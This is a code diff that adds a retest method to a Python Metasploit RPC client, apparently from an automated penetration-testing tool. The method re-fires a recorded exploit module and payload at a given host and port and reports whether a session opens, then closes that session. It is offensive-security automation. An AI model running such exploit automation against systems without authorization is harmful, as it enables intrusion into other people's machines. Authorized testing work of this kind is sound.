@@ -852,6 +852,89 @@ class MsfClient:
                     pass
             self._lport_release(lport)
 
+    def retest_fire(self, module, rhost, port, payload_name):
+        """Re-fire one known module at one host and port with the payload the run
+        recorded, to confirm on demand whether the exploit still lands. This is the
+        console's per-finding retest path: it forces the recorded payload rather than
+        re-selecting, so no host OS is needed, and it terminates any session it opens,
+        proving the access is still there without keeping it. Returns (status, detail):
+        'session' the exploit still lands, 'no_session' it no longer does, 'blocked' or
+        'error' a tooling gap. Reuses the same option-setting, LHOST/LPORT derivation,
+        execute, and session matching the run's fire uses; fire() is untouched."""
+        lport = self._lport_acquire()
+        if lport is None:
+            return "blocked", "LPORT pool exhausted"
+        job_id = None
+        try:
+            exploit = self._client.modules.use("exploit", _strip_type(module))
+            payload = self._client.modules.use("payload", payload_name)
+            lhost = self.cfg.lhost or _lhost_for(rhost)
+            if not lhost:
+                return "blocked", "could not derive LHOST"
+            fails = _apply_options(exploit, [("RHOSTS", rhost), ("RHOST", rhost)])
+            if port:
+                fails += _apply_options(exploit, [("RPORT", int(port))])
+            fails += _apply_options(payload, [("LHOST", lhost),
+                                              ("LPORT", int(lport))])
+            supplied = set(payload.runoptions)
+            outstanding = [o for o in exploit.missing_required
+                           if o not in supplied]
+            if outstanding:
+                fails += self._satisfy_outstanding(exploit, outstanding)
+                supplied = set(payload.runoptions)
+                advanced = self._advanced_options(exploit)
+                outstanding = [o for o in exploit.missing_required
+                               if o not in supplied and o not in advanced]
+            if outstanding or fails:
+                parts = []
+                if outstanding:
+                    parts.append("unset required: "
+                                 + ", ".join(sorted(outstanding)))
+                if fails:
+                    parts.append("rejected: " + ", ".join(
+                        f"{k}={v!r} ({why})" for k, v, why in fails))
+                return "blocked", "; ".join(parts)
+            logger.info("retest %s @ %s:%s payload=%s LHOST=%s LPORT=%s",
+                        module, rhost, port, payload_name, lhost, lport)
+            try:
+                before_sids = set(self._client.sessions.list.keys())
+            except Exception:
+                before_sids = set()
+            result = exploit.execute(payload=payload)
+            if not isinstance(result, dict) or not result.get("uuid"):
+                err = ""
+                if isinstance(result, dict):
+                    err = (result.get("error_message")
+                           or result.get("error_string") or "")
+                return "blocked", err or "execute returned no uuid"
+            job_id = result.get("job_id")
+            matched = self._await_session(result.get("uuid"),
+                                          self.cfg.exploit_timeout, rhost=rhost,
+                                          lport=lport, before=before_sids,
+                                          module=module)
+            if matched is None:
+                logger.info("retest %s @ %s -> no session", module, rhost)
+                return "no_session", "fired, no session within timeout"
+            sid, _sdict = matched
+            logger.info("retest %s @ %s -> SESSION %s opened, closing", module,
+                        rhost, sid)
+            # prove, don't persist: tear down the session the retest opened
+            try:
+                self.session_stop(sid)
+            except Exception:
+                pass
+            return "session", f"session opened and closed ({payload_name})"
+        except Exception as e:
+            logger.warning("retest error %s on %s: %s", module, rhost, e)
+            return "error", f"retest error: {e}"
+        finally:
+            if job_id is not None:
+                try:
+                    self._client.jobs.stop(str(job_id))
+                except Exception:
+                    pass
+            self._lport_release(lport)
+
     def _align_target(self, exploit, full_module, host):
         """Pick the module target that matches the host OS and set it, so the payload
         chosen next agrees with the target and MSF accepts the execute. A multi-target
